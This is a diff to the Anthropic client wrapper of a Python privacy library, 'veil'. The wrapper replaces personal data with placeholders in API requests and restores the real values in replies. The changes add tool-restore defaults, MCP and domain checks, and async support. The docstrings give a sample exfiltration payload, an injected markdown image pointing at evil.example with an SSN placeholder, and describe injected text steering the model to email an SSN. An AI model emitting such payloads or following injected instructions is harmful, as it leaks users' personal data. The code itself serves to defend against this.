@@ -4,7 +4,7 @@
     from veil import Redactor, FINANCE
     from veil.anthropic import wrap
 
-    client = wrap(anthropic.Anthropic(), Redactor(FINANCE))
+    client = wrap(anthropic.Anthropic(), Redactor(FINANCE), restore={"add_member": "all"})
     client.redactor.add_person("Avery K. Mockridge")      # people you already know of
     reply = client.messages.create(model="claude-opus-5-5", max_tokens=1024, tools=TOOLS,
                                    messages=[{"role": "user", "content": "Add Avery Mockridge as an LP"}])
@@ -13,7 +13,16 @@ Each request goes out as a copy with placeholders in place of the real values
 (what the user typed, tool results, the system prompt and the model's earlier
 turns), and the reply's text and tool-call inputs come back with the real
 values.  Use one redactor per conversation.  Thinking blocks go back exactly
-as they came.  The tools' descriptions and ``metadata`` are redacted too.  A
+as they came.  The tools' descriptions and ``metadata`` are redacted too, and
+web search's ``user_location`` goes with its country and timezone only, not
+its city or region (``user_location="send"`` sends it all, ``"drop"`` none).
+A web search or fetch tool's ``allowed_domains`` and ``blocked_domains`` are
+checked, since a placeholder would break them: one that names a person or an
+email domain of this conversation's, or holds anything veil would hide, raises
+``DomainError`` unless ``domains="send"``.
+A request with ``mcp_servers`` raises ``McpError`` unless ``mcp_servers="send"``:
+Anthropic calls those servers itself, so what they return reaches the model
+without placeholders.  A
 content block veil doesn't know raises ``BlockError`` rather than being sent
 as it is.
 
@@ -33,13 +42,24 @@ tool call's input is checked too: a taxpayer ID in one is taken out, and a
 call it objects to, or can't check, raises GuardrailError, so no tool runs on
 it.
 
-A placeholder in a reply's text or a tool call comes back as its real value,
-except inside a URL or a link's target, where it stays a placeholder: text
-the model was tricked into writing ("![](https://evil.example/?d=SSN_001)")
-can't carry a real value off when it's shown or fetched (``restore_urls=True``
-lets it).  ``restore`` says which kinds each tool gets back, so a tool that
-sends things out can be kept to placeholders:
-``restore={"add_member": {"NAME", "SSN"}, "*": set()}``.
+A placeholder in a reply's text comes back as its real value, except inside a
+URL or a link's target, where it stays a placeholder: text the model was
+tricked into writing ("![](https://evil.example/?d=SSN_001)") can't carry a
+real value off when it's shown or fetched (``restore_urls=True`` lets it).
+A tool call gets real values back only for the tools ``restore`` names, so
+text that tells the model to call ``send_email`` with ``SSN_001`` sends the
+placeholder: ``restore={"add_member": "all", "notify": {"EMAIL"}}``, with
+``"*"`` for any other tool, or ``restore="all"`` for every tool.  A tool it
+doesn't name gets placeholders, and a warning says so.
+
+A redactor belongs to one conversation, known by its first message: a request
+that starts with another raises ``ConversationError``, so one user's real
+values can't come back in another's conversation (``one_conversation=False``
+for an app that trims or rewrites the start of a conversation).
+
+An async client (``anthropic.AsyncAnthropic`` ...) is wrapped the same way, and
+its ``messages.create`` is awaited as usual.  The redacting itself, and any
+reading of files or guardrail check, runs in the event loop's thread.
 
 Streaming isn't supported yet: ``stream=True`` raises, and so do
 ``messages.stream``, ``parse``, ``batches``, ``tool_runner`` and the raw
@@ -51,6 +71,10 @@ from __future__ import annotations
 import base64
 import copy
 import hashlib
+import inspect
+import json
+import warnings
+import weakref
 from dataclasses import dataclass, field
 from typing import Any, Callable, Collection, Mapping
 
@@ -71,6 +95,24 @@ class GuardrailError(Exception):
 class FileError(Exception):
     """An image or PDF in a request couldn't be sent without what's in it, so nothing was sent.  The message is
     for the user."""
+
+
+class ConversationError(Exception):
+    """A request for another conversation reached a redactor that holds this one's values, so nothing was sent.
+    The message is for the developer."""
+
+
+# Each redactor's conversation, by a digest of its first message, however many sessions share the redactor.
+_CONVERSATIONS: weakref.WeakKeyDictionary = weakref.WeakKeyDictionary()
+
+
+class McpError(Exception):
+    """A request named MCP servers, whose replies would reach the model without placeholders, so nothing was
+    sent.  The message is for the user."""
+
+
+class DomainError(Exception):
+    """A tool's allowed or blocked domains name someone, so nothing was sent.  The message is for the user."""
 
 
 class BlockError(Exception):
@@ -110,11 +152,29 @@ class Session:
 
     def __init__(self, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
                  files: str | Callable[[bytes, str], str] = "refuse",
-                 restore: Mapping[str, Collection[str] | str | None] | None = None, restore_urls: bool = False):
+                 restore: Mapping[str, Collection[str] | str | None] | str | None = None,
+                 restore_urls: bool = False,
+                 user_location: str = "country", mcp_servers: str = "refuse", domains: str = "check",
+                 one_conversation: bool = True):
         self.redactor = redactor if redactor is not None else Redactor()
-        # The kinds each tool's calls get back, by tool name ("*": any other tool); None: every kind.
-        self.restore = {name: {kinds} if isinstance(kinds, str) else None if kinds is None else set(kinds)
-                        for name, kinds in (restore or {}).items()}
+        self.one_conversation = one_conversation
+        if domains not in ("check", "send"):
+            raise ValueError('domains must be "check" or "send"')
+        self.domains = domains
+        if mcp_servers not in ("refuse", "send"):
+            raise ValueError('mcp_servers must be "refuse" or "send"')
+        self.mcp_servers = mcp_servers
+        if user_location not in ("country", "send", "drop"):
+            raise ValueError('user_location must be "country", "send" or "drop"')
+        self.user_location = user_location
+        # The kinds each tool's calls get back, by tool name ("*": any other tool); None: every kind.  A tool
+        # it doesn't name gets none.
+        if isinstance(restore, str) and restore != "all":
+            raise ValueError('restore must be "all" or {tool name: kinds}')
+        self.restore = {"*": None} if restore == "all" else {
+            name: None if kinds is None or kinds == "all" else {kinds} if isinstance(kinds, str) else set(kinds)
+            for name, kinds in (restore or {}).items()}
+        self._warned: set[str] = set()   # tools a warning has named
         self.restore_urls = restore_urls
         self.guardrail = guardrail
         self.redact_system = redact_system
@@ -132,8 +192,72 @@ class Session:
     def redact_request(self, request: dict) -> dict:
         """A copy of a Messages API request (``messages``, ``system`` ...) with placeholders in it, checked by
         the guardrail if there is one."""
+        first = self._check_conversation(request) if self.one_conversation else None
+        if request.get("mcp_servers") and self.mcp_servers == "refuse":
+            names = ", ".join(str(s.get("name") or s.get("url")) for s in request["mcp_servers"] if isinstance(s, dict))
+            raise McpError(f"This request names MCP servers ({names}). Anthropic would call them itself, so what "
+                           "they return would reach the model without placeholders. Nothing was sent. Pass "
+                           'mcp_servers="send" to let them, or call those tools yourself as your own tools.')
         out = self._redact(request)
-        return self._guard(request, out) if self.guardrail is not None else out
+        if self.domains == "check":
+            self._check_domains(request)
+        out = self._guard(request, out) if self.guardrail is not None else out
+        if first is not None:   # a request that's sent: its first message is the redactor's conversation's now
+            _CONVERSATIONS.setdefault(self.redactor, first)
+        return out
+
+    def _check_conversation(self, request: dict) -> str | None:
+        """The digest of ``request``'s first message.  Raise ConversationError if it isn't the one the
+        redactor's conversation started with, which the first request it sent set."""
+        messages = request.get("messages") or []
+        if not messages:
+            return None
+        first = self._digest(json.dumps(_as_dict(messages[0]), sort_keys=True, default=lambda o: _as_dict(o)
+                                        if hasattr(o, "model_dump") else str(o)))
+        held = _CONVERSATIONS.get(self.redactor)
+        if held is not None and held != first:
+            raise ConversationError(
+                "This request starts with another first message than the conversation its redactor holds, so it "
+                "looks like another conversation, and that one's real values could come back in it. Nothing was "
+                "sent. Wrap a new client (or pass a new Redactor) for each conversation; if this is the same one "
+                "with its start trimmed or rewritten, pass one_conversation=False.")
+        return first
+
+    def _check_domains(self, request: dict) -> None:
+        """Raise DomainError if a tool's allowed or blocked domains name someone.  They can't be replaced with
+        placeholders, which would break the filter, so a request with one isn't sent."""
+        named = []
+        for tool in request.get("tools") or []:
+            t = _as_dict(tool)
+            for key in ("allowed_domains", "blocked_domains"):
+                for domain in (t.get(key) if isinstance(t, dict) else None) or []:
+                    if isinstance(domain, str) and self._personal_domain(domain):
+                        named.append(domain)
+        if named:
+            raise DomainError(f"A tool's allowed or blocked domains ({', '.join(dict.fromkeys(named))}) name someone "
+                              "in this conversation or hold personal information, and a placeholder there would "
+                              'break the filter. Nothing was sent. Pass domains="send" to send them as they are.')
+
+    def _personal_domain(self, domain: str) -> bool:
+        """Whether ``domain`` holds what veil would hide, an email domain of this conversation's (other than a
+        common mail service's), or a known person's surname or whole name run together."""
+        if self.redactor.redact_text(domain) != domain:
+            return True
+        host = domain.casefold().strip().lstrip("*.")
+        letters = "".join(c for c in host if c.isalpha())
+        for placeholder, real in self.redactor.mapping.items():
+            kind = placeholder.rsplit("_", 1)[0]
+            if kind == "EMAIL" and "@" in real:
+                mail = real.rsplit("@", 1)[1].casefold()
+                if mail not in _MAIL_SERVICES and (host == mail or host.endswith("." + mail)):
+                    return True
+            elif kind == "NAME":
+                words = ["".join(c for c in w if c.isalpha()) for w in real.casefold().replace(",", " ").split()]
+                words = [w for w in words if len(w) > 1]
+                whole = "".join(words)
+                if (len(whole) >= 6 and whole in letters) or any(len(w) >= 5 and w in letters for w in words[-1:]):
+                    return True
+        return False
 
     def _redact(self, request: dict) -> dict:
         out = dict(request)
@@ -144,8 +268,8 @@ class Session:
                 out["system"] = self.redactor.redact_text(system)
             elif isinstance(system, list):
                 out["system"] = [self._block(b, "system") for b in system]
-        if self.redact_system and isinstance(request.get("tools"), list):
-            out["tools"] = [self._tool(t) for t in request["tools"]]
+        if isinstance(request.get("tools"), list):
+            out["tools"] = [self._located(self._tool(t) if self.redact_system else t) for t in request["tools"]]
         if isinstance(request.get("metadata"), dict):
             out["metadata"] = self.redactor.redact(request["metadata"])
         return out
@@ -160,6 +284,17 @@ class Session:
                 return [walk(v) for v in value]
             return value
         return walk(_as_dict(tool))
+
+    def _located(self, tool: Any) -> Any:
+        """A server tool (web search) with its ``user_location`` as ``user_location`` says: the country and
+        timezone only, all of it, or none."""
+        t = _as_dict(tool)
+        if not isinstance(t, dict) or not isinstance(t.get("user_location"), dict) or self.user_location == "send":
+            return tool
+        if self.user_location == "drop":
+            return {k: v for k, v in t.items() if k != "user_location"}
+        return {**t, "user_location": {k: v for k, v in t["user_location"].items()
+                                       if k in ("type", "country", "timezone")}}
 
     def _message(self, message: dict) -> dict:
         role = message.get("role")
@@ -324,9 +459,16 @@ class Session:
                 self._set(content, i, block, "text",
                           self.redactor.restore_text(self._get(block, "text"), urls=self.restore_urls))
             elif kind == "tool_use":
-                kinds = self.restore.get(self._get(block, "name"), self.restore.get("*"))
-                self._set(content, i, block, "input",
-                          self.redactor.restore(self._get(block, "input"), kinds, urls=self.restore_urls))
+                name, data = self._get(block, "name"), self._get(block, "input")
+                kinds = self.restore.get(name, self.restore.get("*", set()))
+                restored = self.redactor.restore(data, kinds, urls=self.restore_urls)
+                if name not in self.restore and "*" not in self.restore and name not in self._warned and \
+                        restored != self.redactor.restore(data, urls=self.restore_urls):
+                    self._warned.add(name)
+                    warnings.warn(f"veil gave the {name!r} tool placeholders, not real values, since restore doesn't "
+                                  f'name it: pass restore={{{name!r}: "all"}} (or the kinds it needs) if it should '
+                                  "get them.", stacklevel=3)
+                self._set(content, i, block, "input", restored)
         return response
 
     def _guard_reply(self, content: list) -> None:
@@ -450,10 +592,53 @@ class _Messages:
                              "without placeholders.")
 
 
+# Mail services whose domain says nothing about whose address it is.
+_MAIL_SERVICES = {"gmail.com", "googlemail.com", "outlook.com", "hotmail.com", "live.com", "msn.com", "yahoo.com",
+                  "icloud.com", "me.com", "mac.com", "aol.com", "proton.me", "protonmail.com", "gmx.com", "gmx.de",
+                  "mail.com", "zoho.com", "yandex.com", "fastmail.com", "hey.com"}
+
+
+# What a wrapped client hands out as it is: its settings, and the models list, which sends nothing of yours.
+# Everything else (files, skills, managed agents, raw post and request ...) would send requests without
+# placeholders, so it isn't offered; call it on the client you wrapped, knowing nothing sent through it is
+# redacted.
+_SETTINGS = {"api_key", "auth_token", "access_token", "auth_headers", "custom_auth", "credentials", "base_url",
+             "timeout", "max_retries", "default_headers", "default_query", "platform_headers", "user_agent", "qs",
+             "middleware", "open_telemetry", "webhook_key", "aws_region", "aws_access_key", "aws_secret_key",
+             "aws_session_token", "aws_profile", "region", "project_id", "close", "is_closed", "models"}
+
+
+def _not_offered(name: str) -> AttributeError:
+    return AttributeError(f"veil doesn't wrap {name}, so it isn't offered: it would send requests without "
+                          "placeholders. Call it on the client you wrapped if you mean it to.")
+
+
+class _AsyncMessages(_Messages):
+    """``_Messages`` for an async client: ``create`` and ``count_tokens`` are awaited."""
+
+    async def create(self, **request):
+        if request.get("stream"):
+            raise NotImplementedError("veil doesn't redact streamed replies yet; call without stream=True.")
+        create = self._messages.create
+        response = await create(**self._session.redact_request(request))
+        return self._session.restore_response(response)
+
+    async def count_tokens(self, **request):
+        count_tokens = self._messages.count_tokens
+        return await count_tokens(**self._session.redact_request(request))
+
+
+def _messages(messages, session: Session) -> _Messages:
+    """The SDK's ``messages`` through placeholders, awaited if it's an async client's."""
+    create = getattr(messages, "create", None)   # the SDK's own is behind a decorator that hides it's async
+    is_async = create is not None and inspect.iscoroutinefunction(inspect.unwrap(create))
+    return (_AsyncMessages if is_async else _Messages)(messages, session)
+
+
 class _Beta:
     def __init__(self, beta, session: Session):
         self._beta = beta
-        self.messages = _Messages(beta.messages, session)
+        self.messages = _messages(beta.messages, session)
 
     @property
     def with_raw_response(self):
@@ -464,18 +649,22 @@ class _Beta:
         raise _unwrapped("with_streaming_response", "beta.")
 
     def __getattr__(self, name):
+        if name != "models":
+            raise _not_offered(f"beta.{name}")
         return getattr(self._beta, name)
 
 
 class VeiledClient:
     """An Anthropic client whose ``messages.create`` (and ``beta.messages.create``) go through placeholders.
-    ``with_options`` and ``copy`` give another one, with the same conversation; the legacy ``completions`` and
-    the raw response forms, which would send the request without placeholders, raise."""
+    ``with_options``, ``copy`` and ``with_middleware`` give another one, with the same conversation.  Its
+    settings and ``models`` are the wrapped client's; nothing else is offered (``files``, ``post`` ...), and the
+    legacy ``completions`` and the raw response forms raise, since they would send requests without
+    placeholders."""
 
     def __init__(self, client, session: Session):
         self._client = client
         self.session = session
-        self.messages = _Messages(client.messages, session)
+        self.messages = _messages(client.messages, session)
         if hasattr(client, "beta"):
             self.beta = _Beta(client.beta, session)
 
@@ -488,6 +677,9 @@ class VeiledClient:
 
     def copy(self, *args, **kwargs) -> VeiledClient:
         return VeiledClient(self._client.copy(*args, **kwargs), self.session)
+
+    def with_middleware(self, *args, **kwargs) -> VeiledClient:
+        return VeiledClient(self._client.with_middleware(*args, **kwargs), self.session)
 
     @property
     def completions(self):
@@ -503,13 +695,16 @@ class VeiledClient:
         raise _unwrapped("with_streaming_response", "")
 
     def __getattr__(self, name):
+        if name not in _SETTINGS:
+            raise _not_offered(f"client.{name}")
         return getattr(self._client, name)
 
 
 def wrap(client, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
          files: str | Callable[[bytes, str], str] = "refuse",
-         restore: Mapping[str, Collection[str] | str | None] | None = None,
-         restore_urls: bool = False) -> VeiledClient:
+         restore: Mapping[str, Collection[str] | str | None] | str | None = None,
+         restore_urls: bool = False, user_location: str = "country", mcp_servers: str = "refuse",
+         domains: str = "check", one_conversation: bool = True) -> VeiledClient:
     """``client`` (anthropic.Anthropic, AnthropicBedrock ...) with placeholders on the way out and real values
     on the way back.  Use one per conversation, or pass the conversation's ``redactor``.
 
@@ -517,6 +712,20 @@ def wrap(client, redactor: Redactor | None = None, guardrail=None, redact_system
     here and send it redacted instead, "send" them as they are, or a function ``(data, media_type) -> text`` to read them.
 
     ``restore`` says which placeholder kinds each tool's calls get back as real values, by tool name, with
-    ``"*"`` for any tool not named (``{"add_member": {"NAME", "SSN"}, "*": set()}``); a tool it doesn't cover
-    gets every kind.  ``restore_urls``: put real values back inside URLs too (by default they stay placeholders)."""
-    return VeiledClient(client, Session(redactor, guardrail, redact_system, files, restore, restore_urls))
+    ``"all"`` for every kind and ``"*"`` for any tool not named (``{"add_member": "all", "notify": {"EMAIL"}}``),
+    or ``"all"`` for every tool.  A tool it doesn't name gets placeholders only, with a warning the first time.  ``restore_urls``: put real values back inside URLs too (by default they stay placeholders).
+
+    ``user_location``: what web search's ``user_location`` sends, "country" (its country and timezone, the
+    default), "send" (all of it, city and region too) or "drop" (none).
+
+    ``mcp_servers``: "refuse" a request that names MCP servers (the default), since Anthropic calls them and
+    what they return reaches the model as it is, or "send" it.
+
+    ``domains``: "check" a web search or fetch tool's allowed and blocked domains (the default), refusing a
+    request whose domains name someone, or "send" them as they are.
+
+    ``one_conversation``: refuse a request that starts with another first message than the redactor's
+    conversation (the default), so one conversation's values can't come back in another; False for an app
+    that trims or rewrites the start of a conversation."""
+    return VeiledClient(client, Session(redactor, guardrail, redact_system, files, restore, restore_urls,
+                                        user_location, mcp_servers, domains, one_conversation))
